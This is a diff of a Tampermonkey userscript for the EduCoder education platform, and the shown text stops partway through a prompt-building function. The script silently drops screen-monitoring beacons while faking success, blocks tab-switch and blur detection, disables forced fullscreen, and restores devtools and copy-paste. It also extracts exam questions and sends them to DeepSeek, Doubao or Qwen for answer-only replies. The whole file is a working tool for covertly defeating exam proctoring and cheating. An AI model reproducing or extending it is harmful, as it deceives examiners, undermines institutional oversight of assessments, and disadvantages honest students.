@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name         Fuck EduCoder
 // @namespace    http://tampermonkey.net/
-// @version      1.1
+// @version      1.2
 // @description  禁用EduCoder平台的屏幕监控、防切屏和强制全屏功能，并提供题目提取和AI辅助答案
 // @author       pansoul
 // @match        *://*.educoder.net/*
@@ -12,7 +12,7 @@
 (function() {
     'use strict';
 
-    
+
     const CONSTANTS = {
         SCREEN_MONITOR_URL_PART: 'commit_screen_at.json',
         EXERCISE_API_URL_PART: '/api/exercises/',
@@ -20,19 +20,26 @@
         EXERCISE_GET_API: '/get_exercise.json',
         USER_INFO_API_URL: 'https://data.educoder.net/api/users/get_user_info.json',
 
-       
+
         DEEPSEEK_API_URL: 'https://api.deepseek.com/chat/completions',
         DEEPSEEK_MODEL: 'deepseek-chat',
-        DEEPSEEK_DEFAULT_API_KEY: 'null',
+        DEEPSEEK_REASONER_MODEL: 'deepseek-reasoner',
+        DEEPSEEK_DEFAULT_API_KEY: '',
 
-       
+
         DOUBAO_API_URL: 'https://ark.cn-beijing.volces.com/api/v3/chat/completions',
-        DOUBAO_MODEL: 'doubao-seed-1-6-250615', 
-        DOUBAO_DEFAULT_API_KEY: 'null', 
+        DOUBAO_MODEL: 'doubao-seed-1-6-250615',
+        DOUBAO_DEFAULT_API_KEY: '',
 
-        LOCAL_STORAGE_CURRENT_AI_MODEL: 'current_ai_model', 
-        LOCAL_STORAGE_DEEPSEEK_API_KEY: 'deepseek_api_key', 
+        
+        QWEN_API_URL: 'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions',
+        QWEN_MODEL: 'qwen-plus-latest',
+        QWEN_DEFAULT_API_KEY: '',
+
+        LOCAL_STORAGE_CURRENT_AI_MODEL: 'current_ai_model',
+        LOCAL_STORAGE_DEEPSEEK_API_KEY: 'deepseek_api_key',
         LOCAL_STORAGE_DOUBAO_API_KEY: 'doubao_api_key',
+        LOCAL_STORAGE_QWEN_API_KEY: 'qwen_api_key',
         LOCAL_STORAGE_AUTO_ANSWER: 'auto_generate_answers',
         LOCAL_STORAGE_THINKING_DISABLED: 'disable_deep_thinking',
 
@@ -54,18 +61,18 @@
         VISIBILITY_STATE_VISIBLE: 'visible'
     };
 
-   
+
     const FuckEduCoder = {
         allQuestions: [],
         currentQuestionIndex: 0,
         extractedQuestionsData: null,
-        userInfo: null 
+        userInfo: null
     };
 
 
 
-  
-   
+
+
     FuckEduCoder.originalSendBeacon = navigator.sendBeacon;
     FuckEduCoder.originalGetDisplayMedia = navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia ? navigator.mediaDevices.getDisplayMedia : null;
 
@@ -75,18 +82,18 @@
     FuckEduCoder.originalWinRemoveEventListener = window.removeEventListener;
     FuckEduCoder.originalPreventDefault = Event.prototype.preventDefault;
 
-   
+
     FuckEduCoder.disableScreenMonitoring = () => {
-    
+
     navigator.sendBeacon = function(url, data) {
             if (url.includes(CONSTANTS.SCREEN_MONITOR_URL_PART)) {
-            
-            return true; 
+
+            return true;
         }
             return FuckEduCoder.originalSendBeacon.apply(this, arguments);
     };
 
-   
+
         if (FuckEduCoder.originalGetDisplayMedia) {
         navigator.mediaDevices.getDisplayMedia = function() {
 
@@ -103,7 +110,7 @@
     }
     };
 
-   
+
     FuckEduCoder.disableAntiSwitching = () => {
         // 创建一个辅助函数来检查事件类型和监听器
         const shouldBlockListener = (type, listener) => {
@@ -111,72 +118,72 @@
             if (type === CONSTANTS.EVENT_TYPES.BLUR || type === CONSTANTS.EVENT_TYPES.VISIBILITY_CHANGE) {
                 return true;
             }
-            
+
             // 处理键盘事件
             if ((type === CONSTANTS.EVENT_TYPES.KEYDOWN || type === CONSTANTS.EVENT_TYPES.KEYUP) && listener && listener.toString) {
                 const listenerStr = listener.toString();
-                
+
                 // 阻止F12键相关监听
                 if (listenerStr.includes('F12') || (listenerStr.includes('preventDefault') && listenerStr.includes('key'))) {
                     return true;
                 }
-                
+
                 // 处理复制粘贴快捷键
-                if ((listenerStr.includes(CONSTANTS.KEY_CODES.V) || listenerStr.includes(CONSTANTS.KEY_CODES.C)) && 
+                if ((listenerStr.includes(CONSTANTS.KEY_CODES.V) || listenerStr.includes(CONSTANTS.KEY_CODES.C)) &&
                     (listenerStr.includes('ctrlKey') || listenerStr.includes('metaKey'))) {
                     return false; // 不完全阻止，而是修改
                 }
             }
-            
+
             // 阻止右键菜单限制
-            if (type === CONSTANTS.EVENT_TYPES.CONTEXTMENU && listener && listener.toString && 
+            if (type === CONSTANTS.EVENT_TYPES.CONTEXTMENU && listener && listener.toString &&
                 listener.toString().includes('preventDefault')) {
                 return true;
             }
-            
+
             // 允许粘贴/复制/剪切事件但替换为空函数
-            if (type === CONSTANTS.EVENT_TYPES.PASTE || type === CONSTANTS.EVENT_TYPES.COPY || 
+            if (type === CONSTANTS.EVENT_TYPES.PASTE || type === CONSTANTS.EVENT_TYPES.COPY ||
                 type === CONSTANTS.EVENT_TYPES.CUT) {
                 return 'replace';
             }
-            
+
             return false;
         };
-        
+
         // 修改监听器处理函数
         const wrapKeyListener = (listener) => {
             return function(event) {
-                if ((event.keyCode === CONSTANTS.KEY_CODES.V || event.keyCode === CONSTANTS.KEY_CODES.C) && 
+                if ((event.keyCode === CONSTANTS.KEY_CODES.V || event.keyCode === CONSTANTS.KEY_CODES.C) &&
                     (event.ctrlKey || event.metaKey)) {
                     return true; // 允许复制粘贴
                 }
                 return listener.apply(this, arguments);
             };
         };
-        
+
         // 统一的拦截添加事件监听器的函数
         const interceptAddEventListener = (target, originalMethod, type, listener, options) => {
             const blockResult = shouldBlockListener(type, listener);
-            
+
             if (blockResult === true) {
                 return; // 完全阻止监听器
             }
-            
+
             if (blockResult === 'replace') {
                 // 替换为空函数
                 const emptyListener = function() { return true; };
                 return originalMethod.call(target, type, emptyListener, options);
             }
-            
+
             // 对于键盘事件中的复制粘贴，包装监听器
             if ((type === CONSTANTS.EVENT_TYPES.KEYDOWN || type === CONSTANTS.EVENT_TYPES.KEYUP) && listener && listener.toString) {
                 const listenerStr = listener.toString();
-                if ((listenerStr.includes(CONSTANTS.KEY_CODES.V) || listenerStr.includes(CONSTANTS.KEY_CODES.C)) && 
+                if ((listenerStr.includes(CONSTANTS.KEY_CODES.V) || listenerStr.includes(CONSTANTS.KEY_CODES.C)) &&
                     (listenerStr.includes('ctrlKey') || listenerStr.includes('metaKey'))) {
                     listener = wrapKeyListener(listener);
                 }
             }
-            
+
             return originalMethod.apply(target, [type, listener, options]);
         };
 
@@ -184,7 +191,7 @@
         window.addEventListener = function(type, listener, options) {
             return interceptAddEventListener(window, FuckEduCoder.originalWinAddEventListener, type, listener, options);
         };
-        
+
         document.addEventListener = function(type, listener, options) {
             return interceptAddEventListener(document, FuckEduCoder.originalDocAddEventListener, type, listener, options);
         };
@@ -203,7 +210,7 @@
         });
     };
 
-    
+
     FuckEduCoder.disableFullScreen = () => {
     const fullscreenMethods = [
         'requestFullscreen',
@@ -279,7 +286,7 @@
 
 
 
-    
+
     FuckEduCoder.showMessage = (message, type = 'info') => {
         return new Promise((resolve) => {
             const messageContainer = document.createElement('div');
@@ -297,7 +304,7 @@
                 font-family: Arial, sans-serif;
                 transition: opacity 0.3s ease-in-out;
             `;
-            
+
             if (type === 'error') {
                 messageContainer.style.backgroundColor = '#f44336';
             } else if (type === 'success') {
@@ -307,10 +314,10 @@
             } else {
                 messageContainer.style.backgroundColor = '#2196F3';
             }
-            
+
             messageContainer.textContent = message;
             document.body.appendChild(messageContainer);
-            
+
             setTimeout(() => {
                 messageContainer.style.opacity = '0';
                 setTimeout(() => {
@@ -325,7 +332,7 @@
 
 
 
-    
+
     FuckEduCoder.enableDevToolsAndContextMenu = () => {
         let originalDocKeyDown = document.onkeydown;
     Object.defineProperty(document, 'onkeydown', {
@@ -362,7 +369,7 @@
         document.oncontextmenu = function(event) { console.log('已允许使用右键菜单'); return true; };
         window.oncontextmenu = function(event) { console.log('已允许使用右键菜单(window)'); return true; };
 
-    
+
     Event.prototype.preventDefault = function() {
             if ((this.type === CONSTANTS.EVENT_TYPES.KEYDOWN || this.type === CONSTANTS.EVENT_TYPES.KEYUP)) {
             const key = this.key || this.code || this.keyCode;
@@ -402,27 +409,27 @@
     }, 1000);
     };
 
-    
+
     FuckEduCoder.addStyles = () => {
         const style = document.createElement('style');
         style.textContent = `
             #question-extractor-panel {
                 position: fixed; top: 20px; right: 20px; width: 380px; background-color: #fff;
                 border: none; border-radius: 10px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
-                z-index: 9999; padding: 15px; font-family: "PingFang SC", "Microsoft YaHei", Arial, sans-serif; 
+                z-index: 9999; padding: 15px; font-family: "PingFang SC", "Microsoft YaHei", Arial, sans-serif;
                 max-height: 80vh; overflow-y: auto; transition: all 0.3s ease;
                 will-change: transform; /* 提示浏览器将对元素进行变换，优化性能 */
                 transform: translate3d(0, 0, 0); /* 启用GPU加速 */
                 user-select: none; /* 防止拖动时选中文本 */
             }
-            
+
             #question-extractor-panel.dragging {
                 opacity: 0.9;
                 box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
                 transition: none; /* 拖动时禁用过渡效果以提高响应性 */
                 cursor: move;
             }
-            
+
             #question-extractor-panel::-webkit-scrollbar {
                 width: 6px;
             }
@@ -433,11 +440,11 @@
             #question-extractor-panel::-webkit-scrollbar-track {
                 background-color: #f5f5f5;
             }
-            #question-extractor-panel.minimized { 
+            #question-extractor-panel.minimized {
                 width: 300px; height: auto; overflow: hidden;
                 box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
             }
-            #question-extractor-panel.minimized .panel-content { 
+            #question-extractor-panel.minimized .panel-content {
                 display: block;
                 max-height: 0;
                 overflow: hidden;
@@ -460,25 +467,25 @@
             #question-extractor-panel:not(.minimized) .mini-answer {
                 display: none;
             }
-            .panel-header { 
-                display: flex; justify-content: space-between; align-items: center; 
+            .panel-header {
+                display: flex; justify-content: space-between; align-items: center;
                 margin-bottom: 15px; cursor: move; padding-bottom: 10px;
                 border-bottom: 1px solid #f0f0f0;
                 user-select: none; /* 防止选中标题文本 */
                 touch-action: none; /* 优化触摸操作 */
             }
-            
+
             .panel-header:hover {
                 background-color: #f8f8f8;
                 border-radius: 8px 8px 0 0;
             }
-            
+
             .panel-header:active {
                 background-color: #f0f0f0;
             }
-            
-            .panel-title { 
-                font-weight: 600; font-size: 16px; color: #333; 
+
+            .panel-title {
+                font-weight: 600; font-size: 16px; color: #333;
                 display: flex; align-items: center;
             }
             .panel-title:before {
@@ -487,36 +494,36 @@
                 background-color: #4CAF50; border-radius: 4px;
             }
             .panel-controls { display: flex; }
-            .panel-button { 
-                margin-left: 8px; cursor: pointer; width: 22px; height: 22px; 
-                text-align: center; line-height: 22px; 
+            .panel-button {
+                margin-left: 8px; cursor: pointer; width: 22px; height: 22px;
+                text-align: center; line-height: 22px;
                 background-color: #f5f5f5; border-radius: 4px;
                 transition: all 0.2s ease;
             }
             .panel-button:hover { background-color: #e0e0e0; }
             #close-button:hover { background-color: #f44336; color: white; }
             .panel-content { font-size: 14px; }
-            
+
             #status-message {
-                margin-bottom: 12px; padding: 10px; border-radius: 6px; 
+                margin-bottom: 12px; padding: 10px; border-radius: 6px;
                 background-color: #f8f8f8; text-align: center;
                 font-weight: 500; transition: all 0.3s ease;
                 box-shadow: 0 1px 3px rgba(0,0,0,0.05);
             }
-            
-            .action-buttons { 
+
+            .action-buttons {
                 display: flex; flex-wrap: wrap; gap: 8px;
                 margin-top: 12px; justify-content: center;
             }
-            .action-button { 
-                padding: 8px 12px; background-color: #4CAF50; color: white; 
+            .action-button {
+                padding: 8px 12px; background-color: #4CAF50; color: white;
                 border: none; border-radius: 6px; cursor: pointer; font-size: 13px;
                 flex-grow: 1; text-align: center; transition: all 0.2s ease;
                 min-width: 70px; box-shadow: 0 2px 5px rgba(0,0,0,0.08);
                 border: 1px solid rgba(0,0,0,0.05);
             }
-            .action-button:hover { 
-                background-color: #45a049; 
+            .action-button:hover {
+                background-color: #45a049;
                 transform: translateY(-1px);
                 box-shadow: 0 4px 8px rgba(0,0,0,0.1);
             }
@@ -524,11 +531,11 @@
                 transform: translateY(1px);
                 box-shadow: 0 1px 2px rgba(0,0,0,0.1);
             }
-            
+
             /* 移除了导航按钮相关样式 */
-            
-            .question-item { 
-                margin-bottom: 18px; padding: 15px; border: none; 
+
+            .question-item {
+                margin-bottom: 18px; padding: 15px; border: none;
                 border-radius: 10px; background-color: #fcfcfc;
                 box-shadow: 0 2px 8px rgba(0,0,0,0.06);
                 transition: transform 0.2s ease, box-shadow 0.2s ease;
@@ -537,25 +544,25 @@
                 transform: translateY(-2px);
                 box-shadow: 0 4px 12px rgba(0,0,0,0.1);
             }
-            
-            .question-title { 
-                font-weight: 600; margin-bottom: 10px; 
+
+            .question-title {
+                font-weight: 600; margin-bottom: 10px;
                 line-height: 1.4; font-size: 15px;
             }
-            .question-type { 
-                color: #fff; font-size: 12px; 
+            .question-type {
+                color: #fff; font-size: 12px;
                 background-color: #2196F3; display: inline-block;
                 padding: 3px 8px; border-radius: 12px; margin-bottom: 10px;
             }
-            .question-score { 
-                color: #e91e63; font-size: 12px; 
+            .question-score {
+                color: #e91e63; font-size: 12px;
                 display: inline-block; margin-left: 8px;
                 background-color: rgba(233, 30, 99, 0.1);
                 padding: 3px 8px; border-radius: 12px;
                 font-weight: 500;
             }
             .question-content { margin-bottom: 10px; }
-            .choice-item { 
+            .choice-item {
                 margin: 8px 0 8px 15px; padding: 5px 10px;
                 transition: background-color 0.2s ease;
                 border-radius: 6px; line-height: 1.4;
@@ -563,32 +570,32 @@
             .choice-item:hover {
                 background-color: #f0f0f0;
             }
-            
-            pre { 
-                background-color: #f8f8f8; padding: 12px; border-radius: 8px; 
+
+            pre {
+                background-color: #f8f8f8; padding: 12px; border-radius: 8px;
                 overflow-x: auto; font-family: Consolas, monospace;
                 border: 1px solid #eee; margin: 10px 0;
                 font-size: 13px;
             }
-            .code-block { 
-                font-family: Consolas, monospace; white-space: pre-wrap; 
-                background-color: #f8f8f8; padding: 12px; border-radius: 8px; 
+            .code-block {
+                font-family: Consolas, monospace; white-space: pre-wrap;
+                background-color: #f8f8f8; padding: 12px; border-radius: 8px;
                 margin-top: 10px; max-height: 200px; overflow-y: auto;
                 border: 1px solid #eee; font-size: 13px;
             }
-            
-            .exam-info { 
-                margin-bottom: 15px; padding: 12px; background-color: #e3f2fd; 
-                border-radius: 8px; font-size: 13px; 
+
+            .exam-info {
+                margin-bottom: 15px; padding: 12px; background-color: #e3f2fd;
+                border-radius: 8px; font-size: 13px;
                 border-left: 4px solid #2196F3;
                 line-height: 1.5;
             }
-            
+
             .ai-answer-section {
-                margin-top: 18px; border-top: 1px dashed #ddd; 
+                margin-top: 18px; border-top: 1px dashed #ddd;
                 padding-top: 15px;
             }
-            
+
             .ai-answer {
                 background-color: #f9f9f9;
                 padding: 12px;
@@ -601,14 +608,14 @@
                 user-select: text; /* 允许选择文本 */
                 position: relative;
             }
-            
+
             .ai-answer-header {
                 display: flex;
                 justify-content: space-between;
                 align-items: center;
                 margin-bottom: 8px;
             }
-            
+
             .copy-answer-btn {
                 position: absolute;
                 top: 8px;
@@ -622,13 +629,13 @@
                 transition: all 0.2s ease;
                 color: #666;
             }
-            
+
             .copy-answer-btn:hover {
                 background-color: #4CAF50;
                 color: white;
                 border-color: #4CAF50;
             }
-            
+
             /* 响应式布局调整 */
             @media (max-width: 768px) {
                 #question-extractor-panel {
@@ -646,11 +653,11 @@
     FuckEduCoder.getWebPageChoicesOrder = (questionId) => {
         try {
             const choices = [];
-            
+
             const mainContentAreas = document.querySelectorAll('.exercise-content, .question-content, .edu-question-body, .exercise-body');
 
             for (const area of mainContentAreas) {
-                
+
                 const choiceElements = area.querySelectorAll('.answerWrap, .choice-item, .option-item, label');
 
                 if (choiceElements.length > 0) {
@@ -658,7 +665,7 @@
                         let letter = '';
                         let text = '';
 
-                        
+
                         const letterEl = item.querySelector('.choice-letter, .option-letter');
                         const textEl = item.querySelector('.choice-text, .option-text, .renderHtml');
 
@@ -666,13 +673,13 @@
                             letter = letterEl.textContent.trim().replace(/[^A-Z]/g, '');
                             text = textEl.textContent.trim();
                         } else {
-                            
+
                             const match = item.textContent.match(/^([A-Z])\.\s*(.*)/);
                             if (match) {
                                 letter = match[1];
                                 text = match[2].trim();
                             } else {
-                                
+
                                 const labelText = item.textContent.trim();
                                 const labelMatch = labelText.match(/^([A-Z])\.\s*(.*)/);
                                 if (labelMatch) {
@@ -683,10 +690,12 @@
                         }
 
                         if (letter && text) {
+                            // 对从网页获取的选项文本进行解码，以防有HTML实体
+                            text = FuckEduCoder.decodeHtmlEntities(text);
                             choices.push({ letter, text });
                         }
                     }
-                    
+
                     if (choices.length > 0) {
                         console.log('从网页找到选项顺序:', choices);
                         return choices;
@@ -704,6 +713,51 @@
         try { return atob(str); } catch (e) { return "无法解码代码"; }
     };
 
+    // 添加解码HTML实体的函数
+    FuckEduCoder.decodeHtmlEntities = (str) => {
+        if (!str) return str;
+        // 创建一个临时的div元素来解码HTML实体
+        const tempElement = document.createElement('div');
+        // 使用textContent避免XSS风险
+        tempElement.textContent = str;
+        // 获取解码后的内容
+        const decoded = tempElement.innerHTML;
+
+        // 处理Unicode转义序列
+        return decoded
+            // HTML标签相关
+            .replace(/\\u003c/g, '<')
+            .replace(/\\u003e/g, '>')
+            // 特殊字符
+            .replace(/\\u0026/g, '&')
+            .replace(/\\u0027/g, "'")
+            .replace(/\\u0022/g, '"')
+            .replace(/\\u002F/g, '/')
+            .replace(/\\u005C/g, '\\')
+            .replace(/\\u003d/g, '=')
+            .replace(/\\u003a/g, ':')
+            .replace(/\\u002c/g, ',')
+            .replace(/\\u002e/g, '.')
+            .replace(/\\u002d/g, '-')
+            .replace(/\\u0028/g, '(')
+            .replace(/\\u0029/g, ')')
+            .replace(/\\u005b/g, '[')
+            .replace(/\\u005d/g, ']')
+            .replace(/\\u007b/g, '{')
+            .replace(/\\u007d/g, '}')
+            // 空白字符
+            .replace(/\\u0020/g, ' ')
+            .replace(/\\u0009/g, '\t')
+            .replace(/\\u000a/g, '\n')
+            .replace(/\\u000d/g, '\r')
+            // 通用Unicode转义序列处理
+            .replace(/\\u([0-9a-fA-F]{4})/g, (match, hex) => {
+                return String.fromCharCode(parseInt(hex, 16));
+            })
+            // 换行符
+            .replace(/\\n/g, '\n');
+    };
+
     FuckEduCoder.extractQuestionsToArray = (data) => {
         if (!data || !data.exercise_question_types) { return []; }
         const questions = [];
@@ -718,19 +772,28 @@
             questionType.items.forEach((question) => {
                 const questionData = {
                     type: questionType.name,
-                    title: question.question_title,
+                    title: FuckEduCoder.decodeHtmlEntities(question.question_title),
                     score: question.question_score,
-                    choices: question.question_choices || [],
+                    choices: question.question_choices ? question.question_choices.map(choice => ({
+                        ...choice,
+                        choice_text: FuckEduCoder.decodeHtmlEntities(choice.choice_text)
+                    })) : [],
                     code: question.code ? FuckEduCoder.decodeBase64(question.code) : null,
                     subQuestions: [],
-                    questionId: question.question_id
+                    questionId: question.question_id,
+                    questionType: question.question_type, // 保存原始question_type，用于区分程序填空题(8)等特殊题型
+                    hackId: question.hack_id, // 保存程序填空题的hack_id
+                    hackIdentifier: question.hack_identifier // 保存程序填空题的hack_identifier
                 };
                 if (question.sub_exercise_questions && question.sub_exercise_questions.length > 0) {
                     question.sub_exercise_questions.forEach((subQuestion) => {
                         questionData.subQuestions.push({
-                            title: subQuestion.question_title,
+                            title: FuckEduCoder.decodeHtmlEntities(subQuestion.question_title),
                             score: subQuestion.score,
-                            choices: subQuestion.question_choices || [],
+                            choices: subQuestion.question_choices ? subQuestion.question_choices.map(choice => ({
+                                ...choice,
+                                choice_text: FuckEduCoder.decodeHtmlEntities(choice.choice_text)
+                            })) : [],
                             questionId: subQuestion.question_id
                         });
                     });
@@ -751,12 +814,12 @@
         data.exercise_question_types.forEach((questionType, index) => {
             formattedData += `## ${index + 1}. ${questionType.name} (共${questionType.count}题，每题${questionType.score}分)\n\n`;
             questionType.items.forEach((question, qIndex) => {
-                formattedData += `### ${qIndex + 1}) ${question.question_title}\n`;
+                formattedData += `### ${qIndex + 1}) ${FuckEduCoder.decodeHtmlEntities(question.question_title)}\n`;
                 formattedData += `分值: ${question.question_score}分\n\n`;
                 if (question.question_choices) {
                     question.question_choices.forEach((choice, cIndex) => {
                         const optionLetter = String.fromCharCode(65 + cIndex);
-                        formattedData += `${optionLetter}. ${choice.choice_text}\n`;
+                        formattedData += `${optionLetter}. ${FuckEduCoder.decodeHtmlEntities(choice.choice_text)}\n`;
                     });
                     formattedData += '\n';
                 }
@@ -767,12 +830,12 @@
                 if (question.sub_exercise_questions && question.sub_exercise_questions.length > 0) {
                     formattedData += "子题目:\n\n";
                     question.sub_exercise_questions.forEach((subQuestion, sIndex) => {
-                        formattedData += `#### ${sIndex + 1}. ${subQuestion.question_title}\n`;
+                        formattedData += `#### ${sIndex + 1}. ${FuckEduCoder.decodeHtmlEntities(subQuestion.question_title)}\n`;
                         formattedData += `分值: ${subQuestion.score}分\n\n`;
                         if (subQuestion.question_choices) {
                             subQuestion.question_choices.forEach((choice, scIndex) => {
                                 const optionLetter = String.fromCharCode(65 + scIndex);
-                                formattedData += `${optionLetter}. ${choice.choice_text}\n`;
+                                formattedData += `${optionLetter}. ${FuckEduCoder.decodeHtmlEntities(choice.choice_text)}\n`;
                             });
                             formattedData += '\n';
                         }
@@ -800,49 +863,128 @@
             const currentAiModel = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_CURRENT_AI_MODEL) || 'deepseek';
             let apiUrl, apiKey, model;
 
+            // 检查是否禁用深度思考
+            const disableDeepThinking = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_THINKING_DISABLED) === 'true';
+
             // 根据选择的AI模型确定API配置
             if (currentAiModel === 'deepseek') {
                 apiUrl = CONSTANTS.DEEPSEEK_API_URL;
                 apiKey = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_DEEPSEEK_API_KEY) || CONSTANTS.DEEPSEEK_DEFAULT_API_KEY;
-                model = CONSTANTS.DEEPSEEK_MODEL;
-            } else { 
+                // 根据是否启用深度思考选择不同的模型
+                model = disableDeepThinking ? CONSTANTS.DEEPSEEK_MODEL : CONSTANTS.DEEPSEEK_REASONER_MODEL;
+            } else if (currentAiModel === 'qwen') {
+                apiUrl = CONSTANTS.QWEN_API_URL;
+                apiKey = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_QWEN_API_KEY) || CONSTANTS.QWEN_DEFAULT_API_KEY;
+                model = CONSTANTS.QWEN_MODEL;
+            } else {
                 apiUrl = CONSTANTS.DOUBAO_API_URL;
                 apiKey = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_DOUBAO_API_KEY) || CONSTANTS.DOUBAO_DEFAULT_API_KEY;
                 model = CONSTANTS.DOUBAO_MODEL;
             }
 
-            // 检查是否禁用深度思考
-            const disableDeepThinking = localStorage.getItem(CONSTANTS.LOCAL_STORAGE_THINKING_DISABLED) === 'true';
-
             // 准备请求数据
-            const requestData = {
-                model: model,
-                messages: [{ role: 'user', content: [{ type: 'text', text: prompt }] }],
-                // 根据模型和设置决定是否添加thinking配置
-                ...(currentAiModel === 'doubao' && disableDeepThinking && { thinking: { type: 'disabled' } })
-            };
+            let requestData = {};
+
+            // 根据不同模型准备不同的请求数据
+            if (currentAiModel === 'qwen') {
+                // 通义千问模型的请求格式
+                requestData = {
+                    model: model,
+                    messages: [
+                        { role: 'system', content: 'You are a helpful assistant.' },
+                        { role: 'user', content: prompt }
+                    ]
+                };
+
+                // 只有在非禁用深度思考时才添加enable_thinking参数
+                if (!disableDeepThinking) {
+                    requestData.stream = true;
+                    requestData.enable_thinking = true;
+                    requestData.stream_options = {
+                        include_usage: true
+                    };
+                }
+            } else if (currentAiModel === 'doubao') {
+                // 豆包模型的请求格式
+                requestData = {
+                    model: model,
+                    messages: [{ role: 'user', content: [{ type: 'text', text: prompt }] }]
+                };
+
+                // 只有在禁用深度思考时才添加thinking配置
+                if (disableDeepThinking) {
+                    requestData.thinking = { type: 'disabled' };
+                }
+            } else {
+                // DeepSeek模型的请求格式
+                requestData = {
+                    model: model,
+                    messages: [{ role: 'user', content: [{ type: 'text', text: prompt }] }]
+                };
+                // DeepSeek通过切换模型实现深度思考，不需要额外参数
+            }
 
             // 发送API请求
-            const response = await fetch(apiUrl, { 
-                method: 'POST', 
-                headers: { 
-                    'Content-Type': 'application/json', 
-                    'Authorization': `Bearer ${apiKey}` 
-                }, 
-                body: JSON.stringify(requestData) 
+            const response = await fetch(apiUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Authorization': `Bearer ${apiKey}`
+                },
+                body: JSON.stringify(requestData)
             });
 
-            if (!response.ok) { 
-                throw new Error(`API请求失败: ${response.status}`); 
+            if (!response.ok) {
+                const errorText = await response.text();
+                console.error('API响应错误:', errorText);
+                throw new Error(`API请求失败: ${response.status}`);
             }
-            
-            const responseData = await response.json();
 
-            if (responseData.choices && responseData.choices.length > 0 && 
-                responseData.choices[0].message && responseData.choices[0].message.content) {
-                return responseData.choices[0].message.content;
-            } else { 
-                throw new Error('API响应格式不正确'); 
+            // 对于通义千问的流式响应需要特殊处理
+            if (currentAiModel === 'qwen' && !disableDeepThinking) {
+                // 处理流式响应
+                const reader = response.body.getReader();
+                let fullText = '';
+                let decoder = new TextDecoder();
+
+                while (true) {
+                    const { done, value } = await reader.read();
+                    if (done) break;
+
+                    const chunk = decoder.decode(value, { stream: true });
+                    const lines = chunk.split('\n').filter(line => line.trim() !== '');
+
+                    for (const line of lines) {
+                        if (line.startsWith('data: ')) {
+                            const jsonStr = line.slice(6);
+                            if (jsonStr === '[DONE]') continue;
+
+                            try {
+                                const jsonData = JSON.parse(jsonStr);
+                                if (jsonData.choices && jsonData.choices.length > 0) {
+                                    const delta = jsonData.choices[0].delta;
+                                    if (delta && delta.content) {
+                                        fullText += delta.content;
+                                    }
+                                }
+                            } catch (e) {
+                                console.error('解析流式数据出错:', e);
+                            }
+                        }
+                    }
+                }
+
+                return fullText;
+            } else {
+                // 非流式响应的处理方式
+                const responseData = await response.json();
+
+                if (responseData.choices && responseData.choices.length > 0 &&
+                    responseData.choices[0].message && responseData.choices[0].message.content) {
+                    return responseData.choices[0].message.content;
+                } else {
+                    throw new Error('API响应格式不正确');
+                }
             }
         } catch (error) {
             console.error('AI API调用出错:', error);
@@ -852,46 +994,59 @@
 
     // 创建辅助函数来构建提示词
     FuckEduCoder.buildPromptForQuestion = (question) => {
-        let prompt = `请回答以下${question.type}，不用给出任何解释，直接给出答案以及选项的内容：\n\n${question.title}\n\n`;
-        
-        // 获取网页上显示的选项顺序
-        const webPageChoices = FuckEduCoder.getWebPageChoicesOrder(question.questionId);
+        // 根据题目类型确定提示词
+        let prompt = '';
 
-        // 添加选项信息
-        if (question.choices && question.choices.length > 0) {
-            if (webPageChoices && webPageChoices.length > 0) {
-                prompt += `网页中显示的选项顺序：\n`;
-                webPageChoices.forEach((choice) => { 
-                    prompt += `${choice.letter}. ${choice.text}\n`; 
-                });
-            } else {
-                prompt += `API中的选项顺序（可能与网页显示不同）：\n`;
-                question.choices.forEach((choice, index) => {
-                    const optionLetter = String.fromCharCode(65 + index);
-                    prompt += `${optionLetter}. ${choice.choice_text}\n`;
-                });
+        // 特殊处理程序填空题
+        if (question.questionType === 8) {
+            prompt = `请回答以下程序填空题，不要使用反引号：\n\n${question.title}\n\n`;
+            if (question.code) {
+                prompt += `代码：\n${question.code}\n\n`;
+                prompt += `请分析上面的代码，找出标记为"@□@"的填空位置，并给出每个空应该填写的代码。\n`;
+                prompt += `请直接给出填空答案，不要有多余的解释，每个空的答案单独一行。\n`;
+                prompt += `不要使用反引号或代码块格式，直接给出代码文本。\n`;
             }
-        }
+        } else {
+            // 其他题型的处理
+            prompt = `请回答以下${question.type}，不用给出任何解释，直接给出答案以及选项的内容：\n\n${question.title}\n\n`;
 
-        // 添加代码信息
-        if (question.code) { 
-            prompt += `\n代码：\n${question.code}\n`; 
-        }
+            // 获取网页上显示的选项顺序
+            const webPageChoices = FuckEduCoder.getWebPageChoicesOrder(question.questionId);
 
-        // 根据题目类型添加特定指导
-        if (question.type === '单选题' || question.type === '多选题') { 
-            prompt += '\n请直接给出正确选项字母，不用给出任何解释，直接给出答案以及选项的内容。在回答中明确标记如：选项A(对应的选项内容)正确。'; 
-        } else if (question.type === '判断题') { 
-            prompt += '\n请直接给出"正确"或"错误"的判断，不用给出任何解释，直接给出答案以及选项的内容。'; 
-        } else if (question.type === '填空题') { 
-            prompt += '\n请直接给出填空的内容，不用给出任何解释，直接给出答案以及选项的内容。'; 
-        } else if (question.type === '程序填空题') { 
-            prompt += '\n请给出每个空应该填写的代码，不用给出任何解释，直接给出答案以及选项的内容。'; 
-        }
+            // 添加选项信息
+            if (question.choices && question.choices.length > 0) {
+                if (webPageChoices && webPageChoices.length > 0) {
+                    prompt += `网页中显示的选项顺序：\n`;
+                    webPageChoices.forEach((choice) => {
+                        prompt += `${choice.letter}. ${choice.text}\n`;
+                    });
+                } else {
+                    prompt += `API中的选项顺序（可能与网页显示不同）：\n`;
+                    question.choices.forEach((choice, index) => {
+                        const optionLetter = String.fromCharCode(65 + index);
+                        prompt += `${optionLetter}. ${choice.choice_text}\n`;
+                    });
+                }
+            }
 
-        // 强调需要包含选项内容
-        if (question.choices && question.choices.length > 0) { 
-            prompt += '\n\n重要：请在回答中包含选项内容，例如"选项A(XXXX)正确"，这样用户可以根据选项内容比对网页中的选项。'; 
+            // 添加代码信息
+            if (question.code) {
+                prompt += `\n代码：\n${question.code}\n`;
+            }
+
